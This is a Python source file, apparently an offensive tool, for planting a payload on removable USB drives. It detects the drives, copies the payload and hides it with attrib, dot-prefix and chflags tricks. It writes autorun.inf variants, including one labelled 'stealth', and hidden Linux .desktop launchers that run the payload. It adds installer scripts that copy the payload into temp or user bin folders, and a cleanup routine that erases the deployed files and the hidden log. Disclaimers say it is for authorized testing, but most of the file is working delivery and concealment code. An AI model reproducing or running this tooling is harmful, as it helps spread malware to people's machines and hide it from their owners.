"""
Enhanced USB Deployment with Advanced Features
WARNING: For authorized testing and educational purposes only.
"""
import os
import shutil
import platform
import stat
from typing import List, Dict, Optional, Tuple
from pathlib import Path
import subprocess
import json
from datetime import datetime


class EnhancedUSBDeployment:
    """
    Enhanced USB deployment with advanced cross-platform features.
    
    Features:
    - Advanced cross-platform detection
    - Smart autorun creation
    - Multiple hidden file methods
    - Rich package creation
    - Intelligent cleanup
    """
    
    def __init__(self):
        self.system = platform.system()
        self.detected_drives = []
        self.deployment_log = []
    
    def detect_usb_drives_advanced(self) -> List[Dict]:
        """Advanced USB detection with detailed information"""
        drives = []
        
        if self.system == "Windows":
            drives = self._detect_windows_advanced()
        elif self.system == "Linux":
            drives = self._detect_linux_advanced()
        elif self.system == "Darwin":
            drives = self._detect_macos_advanced()
        
        self.detected_drives = drives
        return drives
    
    def _detect_windows_advanced(self) -> List[Dict]:
        """Advanced Windows USB detection"""
        drives = []
        
        try:
            import string
            import win32api
            import win32file
            
            for letter in string.ascii_uppercase:
                drive_path = f"{letter}:\\"
                if os.path.exists(drive_path):
                    try:
                        # Get drive type
                        drive_type = win32file.GetDriveType(drive_path)
                        
                        # DRIVE_REMOVABLE = 2
                        if drive_type == 2:
                            # Get volume info
                            volume_name = win32api.GetVolumeInformation(drive_path)[0]
                            free_space = win32api.GetDiskFreeSpaceEx(drive_path)[0]
                            total_space = win32api.GetDiskFreeSpaceEx(drive_path)[1]
                            
                            drives.append({
                                "drive": letter,
                                "path": drive_path,
                                "name": volume_name or "USB Drive",
                                "type": "removable",
                                "free_space": free_space,
                                "total_space": total_space,
                                "free_gb": free_space / (1024**3),
                                "total_gb": total_space / (1024**3)
                            })
                    except ImportError:
                        # Fallback without pywin32
                        try:
                            result = subprocess.run(
                                ["wmic", "logicaldisk", "get", 
                                 "name,drivetype,volumename,freespace,size"],
                                capture_output=True,
                                text=True,
                                timeout=2
                            )
                            # Parse wmic output
                            for line in result.stdout.split('\n'):
                                if f"{letter}:" in line and "2" in line:
                                    parts = line.split()
                                    drives.append({
                                        "drive": letter,
                                        "path": drive_path,
                                        "name": parts[-1] if len(parts) > 1 else "USB Drive",
                                        "type": "removable"
                                    })
                        except:
                            # Simple fallback
                            if os.access(drive_path, os.W_OK):
                                drives.append({
                                    "drive": letter,
                                    "path": drive_path,
                                    "name": "USB Drive",
                                    "type": "unknown"
                                })
        except Exception as e:
            print(f"USB detection error: {e}")
        
        return drives
    
    def _detect_linux_advanced(self) -> List[Dict]:
        """Advanced Linux USB detection"""
        drives = []
        
        try:
            # Check /media and /mnt
            media_paths = ["/media", "/mnt", "/run/media"]
            
            for base_path in media_paths:
                if os.path.exists(base_path):
                    for item in os.listdir(base_path):
                        full_path = os.path.join(base_path, item)
                        if os.path.isdir(full_path) and os.access(full_path, os.W_OK):
                            # Get mount info
                            try:
                                result = subprocess.run(
                                    ["df", "-h", full_path],
                                    capture_output=True,
                                    text=True,
                                    timeout=2
                                )
                                # Parse df output for size info
                                lines = result.stdout.split('\n')
                                if len(lines) > 1:
                                    parts = lines[1].split()
                                    if len(parts) >= 4:
                                        size = parts[1]
                                        used = parts[2]
                                        available = parts[3]
                                        
                                        drives.append({
                                            "drive": item,
                                            "path": full_path,
                                            "name": item,
                                            "type": "removable",
                                            "size": size,
                                            "used": used,
                                            "available": available
                                        })
                                        continue
                            except:
                                pass
                            
                            # Simple entry
                            drives.append({
                                "drive": item,
                                "path": full_path,
                                "name": item,
                                "type": "removable"
                            })
        except Exception as e:
            print(f"USB detection error: {e}")
        
        return drives
    
    def _detect_macos_advanced(self) -> List[Dict]:
        """Advanced macOS USB detection"""
        drives = []
        
        try:
            volumes_path = "/Volumes"
            if os.path.exists(volumes_path):
                for item in os.listdir(volumes_path):
                    full_path = os.path.join(volumes_path, item)
                    if os.path.isdir(full_path) and os.access(full_path, os.W_OK):
                        # Skip system volumes
                        if item in ["Macintosh HD", "System", "Preboot", "Recovery"]:
                            continue
                        
                        # Get disk info
                        try:
                            result = subprocess.run(
                                ["df", "-h", full_path],
                                capture_output=True,
                                text=True,
                                timeout=2
                            )
                            lines = result.stdout.split('\n')
                            if len(lines) > 1:
                                parts = lines[1].split()
                                if len(parts) >= 4:
                                    drives.append({
                                        "drive": item,
                                        "path": full_path,
                                        "name": item,
                                        "type": "removable",
                                        "size": parts[1],
                                        "used": parts[2],
                                        "available": parts[3]
                                    })
                                    continue
                        except:
                            pass
                        
                        drives.append({
                            "drive": item,
                            "path": full_path,
                            "name": item,
                            "type": "removable"
                        })
        except Exception as e:
            print(f"USB detection error: {e}")
        
        return drives
    
    def deploy_with_advanced_hiding(self, payload_path: str, usb_drive: str,
                                   hide_method: str = "auto") -> Dict:
        """Deploy with advanced hiding methods"""
        if len(usb_drive) == 1:
            usb_path = f"{usb_drive}:\\"
        else:
            usb_path = usb_drive
        
        if not os.path.exists(usb_path):
            return {"error": "USB drive not found"}
        
        try:
            payload_name = os.path.basename(payload_path)
            destination = os.path.join(usb_path, payload_name)
            
            # Copy payload
            shutil.copy2(payload_path, destination)
            
            result = {
                "success": True,
                "payload": payload_name,
                "destination": destination,
                "hide_method": None
            }
            
            # Apply hiding method
            if self.system == "Windows":
                result["hide_method"] = self._hide_windows(destination, hide_method)
            elif self.system == "Linux":
                result["hide_method"] = self._hide_linux(destination, hide_method)
            elif self.system == "Darwin":
                result["hide_method"] = self._hide_macos(destination, hide_method)
            
            # Log deployment
            self._log_deployment(result)
            
            return result
            
        except Exception as e:
            return {"error": f"Deployment failed: {str(e)}"}
    
    def _hide_windows(self, file_path: str, method: str) -> Dict:
        """Hide file on Windows using multiple methods"""
        methods_applied = []
        
        try:
            # Method 1: Hidden attribute
            if method in ["auto", "attrib"]:
                subprocess.run(
                    ["attrib", "+H", "+S", "+R", file_path],
                    check=True,
                    timeout=2
                )
                methods_applied.append("attrib_hidden")
            
            # Method 2: System file attribute
            if method in ["auto", "system"]:
                subprocess.run(
                    ["attrib", "+S", file_path],
                    check=True,
                    timeout=2
                )
                methods_applied.append("system_file")
            
            # Method 3: Rename with dot prefix (if not already)
            if method == "dot_prefix" and not os.path.basename(file_path).startswith("."):
                dir_path = os.path.dirname(file_path)
                new_name = "." + os.path.basename(file_path)
                new_path = os.path.join(dir_path, new_name)
                os.rename(file_path, new_path)
                methods_applied.append("dot_prefix")
                return {"methods": methods_applied, "new_path": new_path}
            
        except Exception as e:
            return {"methods": methods_applied, "error": str(e)}
        
        return {"methods": methods_applied}
    
    def _hide_linux(self, file_path: str, method: str) -> Dict:
        """Hide file on Linux"""
        methods_applied = []
        
        try:
            # Method 1: Dot prefix
            if not os.path.basename(file_path).startswith("."):
                dir_path = os.path.dirname(file_path)
                new_name = "." + os.path.basename(file_path)
                new_path = os.path.join(dir_path, new_name)
                os.rename(file_path, new_path)
                methods_applied.append("dot_prefix")
                return {"methods": methods_applied, "new_path": new_path}
            
            # Method 2: Remove execute permission (make less obvious)
            os.chmod(file_path, stat.S_IRUSR | stat.S_IWUSR)
            methods_applied.append("no_execute")
            
        except Exception as e:
            return {"methods": methods_applied, "error": str(e)}
        
        return {"methods": methods_applied}
    
    def _hide_macos(self, file_path: str, method: str) -> Dict:
        """Hide file on macOS"""
        methods_applied = []
        
        try:
            # Method 1: Dot prefix
            if not os.path.basename(file_path).startswith("."):
                dir_path = os.path.dirname(file_path)
                new_name = "." + os.path.basename(file_path)
                new_path = os.path.join(dir_path, new_name)
                os.rename(file_path, new_path)
                methods_applied.append("dot_prefix")
                return {"methods": methods_applied, "new_path": new_path}
            
            # Method 2: Extended attributes (hidden flag)
            try:
                subprocess.run(
                    ["chflags", "hidden", file_path],
                    check=True,
                    timeout=2
                )
                methods_applied.append("chflags_hidden")
            except:
                pass
            
        except Exception as e:
            return {"methods": methods_applied, "error": str(e)}
        
        return {"methods": methods_applied}
    
    def create_advanced_autorun(self, usb_path: str, payload_name: str,
                               autorun_type: str = "standard") -> Dict:
        """Create advanced autorun with multiple options"""
        if self.system == "Windows":
            return self._create_advanced_autorun_windows(usb_path, payload_name, autorun_type)
        elif self.system == "Linux":
            return self._create_advanced_autorun_linux(usb_path, payload_name, autorun_type)
        else:
            return {"error": "Autorun not supported on this system"}
    
    def _create_advanced_autorun_windows(self, usb_path: str, payload_name: str,
                                        autorun_type: str) -> Dict:
        """Create advanced Windows autorun"""
        autorun_configs = {
            "standard": f"""[autorun]
open={payload_name}
action=Open files
label=USB Files
icon={payload_name}
""",
            "stealth": f"""[autorun]
open={payload_name}
action=Open files
label=USB Files
icon={payload_name}
shellexecute={payload_name}
""",
            "double_click": f"""[autorun]
open={payload_name}
action=Open files
label=USB Files
icon={payload_name}
shell\\open\\command={payload_name}
shell\\open\\default=1
"""
        }
        
        autorun_content = autorun_configs.get(autorun_type, autorun_configs["standard"])
        autorun_path = os.path.join(usb_path, "autorun.inf")
        
        try:
            with open(autorun_path, 'w') as f:
                f.write(autorun_content)
            
            # Hide autorun.inf
            try:
                subprocess.run(
                    ["attrib", "+H", "+S", autorun_path],
                    check=True,
                    timeout=2
                )
            except:
                pass
            
            return {
                "success": True,
                "file": "autorun.inf",
                "path": autorun_path,
                "type": autorun_type,
                "warning": "Modern Windows may block autorun. Test in isolated environment."
            }
        except Exception as e:
            return {"error": f"Could not create autorun: {str(e)}"}
    
    def _create_advanced_autorun_linux(self, usb_path: str, payload_name: str,
                                      autorun_type: str) -> Dict:
        """Create advanced Linux autorun"""
        desktop_configs = {
            "standard": f"""[Desktop Entry]
Name=USB Files
Exec=python3 {payload_name}
Type=Application
Terminal=false
""",
            "hidden": f"""[Desktop Entry]
Name=USB Files
Exec=python3 {payload_name}
Type=Application
Terminal=false
NoDisplay=true
Hidden=true
""",
            "trusted": f"""[Desktop Entry]
Name=USB Files
Exec=python3 {payload_name}
Type=Application
Terminal=false
Trusted=true
"""
        }
        
        desktop_content = desktop_configs.get(autorun_type, desktop_configs["standard"])
        desktop_path = os.path.join(usb_path, "usb_files.desktop")
        
        try:
            with open(desktop_path, 'w') as f:
                f.write(desktop_content)
            
            os.chmod(desktop_path, 0o755)
            
            return {
                "success": True,
                "file": "usb_files.desktop",
                "path": desktop_path,
                "type": autorun_type,
                "warning": "Linux desktop files require user interaction."
            }
        except Exception as e:
            return {"error": f"Could not create desktop file: {str(e)}"}
    
    def create_rich_package(self, payload_path: str, output_dir: str,
                           package_config: Optional[Dict] = None) -> Dict:
        """Create rich USB package with multiple files"""
        os.makedirs(output_dir, exist_ok=True)
        
        config = package_config or {}
        package_files = []
        
        # Copy payload
        payload_name = os.path.basename(payload_path)
        dest_payload = os.path.join(output_dir, payload_name)
        shutil.copy2(payload_path, dest_payload)
        package_files.append(payload_name)
        
        # Create comprehensive README
        readme_content = self._generate_rich_readme(payload_name, config)
        readme_path = os.path.join(output_dir, "README.txt")
        with open(readme_path, 'w') as f:
            f.write(readme_content)
        package_files.append("README.txt")
        
        # Create autorun
        if config.get("include_autorun", True):
            autorun = self.create_advanced_autorun(
                output_dir,
                payload_name,
                config.get("autorun_type", "standard")
            )
            if autorun.get("success"):
                package_files.append(autorun["file"])
        
        # Create manifest
        manifest = {
            "package_name": config.get("package_name", "USB Deployment Package"),
            "payload": payload_name,
            "created_at": datetime.now().isoformat(),
            "version": config.get("version", "1.0"),
            "files": package_files,
            "warnings": [
                "For authorized testing only",
                "Use in isolated environments",
                "Do not use on production systems"
            ]
        }
        
        manifest_path = os.path.join(output_dir, "manifest.json")
        with open(manifest_path, 'w') as f:
            json.dump(manifest, f, indent=2)
        package_files.append("manifest.json")
        
        # Create installation script (optional)
        if config.get("include_installer", False):
            installer = self._create_installer_script(output_dir, payload_name)
            if installer:
                package_files.append(installer)
        
        return {
            "success": True,
            "package_dir": output_dir,
            "files": package_files,
            "manifest": manifest,
            "warning": "Authorized testing only."
        }
    
    def _generate_rich_readme(self, payload_name: str, config: Dict) -> str:
        """Generate comprehensive README"""
        return f"""USB Deployment Package
{'=' * 50}

Package: {config.get('package_name', 'USB Deployment Package')}
Payload: {payload_name}
Version: {config.get('version', '1.0')}
Created: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

{'=' * 50}
⚠️  WARNING: FOR AUTHORIZED TESTING ONLY
{'=' * 50}

This package is for:
✅ Authorized penetration testing
✅ Educational purposes
✅ Isolated test environments
✅ Systems you own or have explicit authorization

DO NOT USE:
❌ On production systems
❌ Without authorization
❌ On systems you don't own
❌ For malicious purposes

{'=' * 50}
DEPLOYMENT INSTRUCTIONS
{'=' * 50}

1. Copy all files to USB drive root directory
2. Ensure USB is properly formatted
3. Test in isolated VM first
4. Verify autorun behavior (if enabled)
5. Document all testing activities

{'=' * 50}
PAYLOAD INFORMATION
{'=' * 50}

Payload Type: {payload_name}
Platform: {platform.system()}

This payload is for educational and authorized testing purposes only.

{'=' * 50}
LEGAL NOTICE
{'=' * 50}

Unauthorized use of this package is illegal and may violate:
- Computer Fraud and Abuse Act (CFAA)
- Local computer crime laws
- Terms of service agreements

You are solely responsible for your actions.

{'=' * 50}
SUPPORT
{'=' * 50}

For questions about authorized use:
- Consult legal counsel
- Review security policies
- Contact cybersecurity professionals

Created for educational and authorized penetration testing.
"""
    
    def _create_installer_script(self, output_dir: str, payload_name: str) -> Optional[str]:
        """Create installer script for package"""
        if self.system == "Windows":
            script_content = f"""@echo off
REM USB Package Installer
echo Installing {payload_name}...
copy "{payload_name}" "%TEMP%\\{payload_name}"
echo Installation complete.
pause
"""
            script_path = os.path.join(output_dir, "install.bat")
            with open(script_path, 'w') as f:
                f.write(script_content)
            return "install.bat"
        elif self.system in ["Linux", "Darwin"]:
            script_content = f"""#!/bin/bash
# USB Package Installer
echo "Installing {payload_name}..."
cp "{payload_name}" "$HOME/.local/bin/{payload_name}"
chmod +x "$HOME/.local/bin/{payload_name}"
echo "Installation complete."
"""
            script_path = os.path.join(output_dir, "install.sh")
            with open(script_path, 'w') as f:
                f.write(script_content)
            os.chmod(script_path, 0o755)
            return "install.sh"
        return None
    
    def intelligent_cleanup(self, usb_drive: str, 
                          cleanup_config: Optional[Dict] = None) -> Dict:
        """Intelligent cleanup with multiple options"""
        if len(usb_drive) == 1:
            usb_path = f"{usb_drive}:\\"
        else:
            usb_path = usb_drive
        
        if not os.path.exists(usb_path):
            return {"error": "USB drive not found"}
        
        config = cleanup_config or {}
        removed = []
        errors = []
        
        # Load deployment log if available
        log_file = os.path.join(usb_path, ".jarvis_deploy.log")
        deployed_files = []
        
        if os.path.exists(log_file):
            try:
                with open(log_file, 'r') as f:
                    deployed_files = json.load(f)
            except:
                pass
        
        try:
            # Method 1: Remove logged files
            if config.get("use_log", True) and deployed_files:
                for file_info in deployed_files:
                    file_path = os.path.join(usb_path, file_info.get("file", ""))
                    if os.path.exists(file_path):
                        try:
                            os.remove(file_path)
                            removed.append(file_info["file"])
                        except Exception as e:
                            errors.append(f"{file_info['file']}: {str(e)}")
            
            # Method 2: Pattern-based cleanup
            if config.get("pattern_cleanup", True):
                patterns = config.get("patterns", [".py", ".exe", ".bat", ".ps1", "autorun.inf", ".desktop"])
                for file in os.listdir(usb_path):
                    if any(file.endswith(pattern) or pattern in file for pattern in patterns):
                        file_path = os.path.join(usb_path, file)
                        if os.path.isfile(file_path):
                            try:
                                os.remove(file_path)
                                if file not in removed:
                                    removed.append(file)
                            except Exception as e:
                                errors.append(f"{file}: {str(e)}")
            
            # Method 3: Remove hidden files
            if config.get("remove_hidden", True):
                for file in os.listdir(usb_path):
                    if file.startswith(".") and file != "." and file != "..":
                        file_path = os.path.join(usb_path, file)
                        if os.path.isfile(file_path):
                            try:
                                os.remove(file_path)
                                if file not in removed:
                                    removed.append(file)
                            except Exception as e:
                                errors.append(f"{file}: {str(e)}")
            
            # Remove log file
            if os.path.exists(log_file):
                try:
                    os.remove(log_file)
                except:
                    pass
            
            return {
                "success": True,
                "removed": removed,
                "count": len(removed),
                "errors": errors if errors else None
            }
            
        except Exception as e:
            return {"error": f"Cleanup failed: {str(e)}"}
    
    def _log_deployment(self, deployment_info: Dict):
        """Log deployment for intelligent cleanup"""
        self.deployment_log.append({
            "timestamp": datetime.now().isoformat(),
            "file": deployment_info.get("payload", ""),
            "destination": deployment_info.get("destination", ""),
            "hide_method": deployment_info.get("hide_method", {})
        })
    
    def save_deployment_log(self, usb_path: str):
        """Save deployment log to USB"""
        log_file = os.path.join(usb_path, ".jarvis_deploy.log")
        try:
            with open(log_file, 'w') as f:
                json.dump(self.deployment_log, f, indent=2)
            # Hide log file
            if self.system == "Windows":
                try:
                    subprocess.run(
                        ["attrib", "+H", log_file],
                        check=True,
                        timeout=2
                    )
                except:
                    pass
        except:
            pass
